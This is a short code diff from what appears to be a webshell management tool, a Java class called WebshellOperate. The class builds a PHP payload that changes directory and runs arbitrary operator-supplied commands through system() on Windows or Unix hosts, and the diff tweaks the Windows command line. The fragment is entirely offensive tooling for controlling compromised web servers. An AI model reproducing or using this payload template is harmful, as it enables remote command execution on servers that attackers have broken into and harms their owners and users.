@@ -123,7 +123,7 @@ public class WebshellOperate {
         path = path.replace("\\","\\\\").replace("\"","\\\"");
         String poc = "chdir(\"%1$s\");\n" +
                 "if( strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {\n" +
-                "    system(\"chcp 65001 > NULL & %2$s 2>&1 & echo %3$s & chdir\");\n" +
+                "    system(\"%2$s 2>&1 & echo %3$s & chdir\");\n" +
                 "}else{\n" +
                 "    system(\"%2$s 2>&1 ; echo %3$s ; pwd\");\n" +
                 "}";
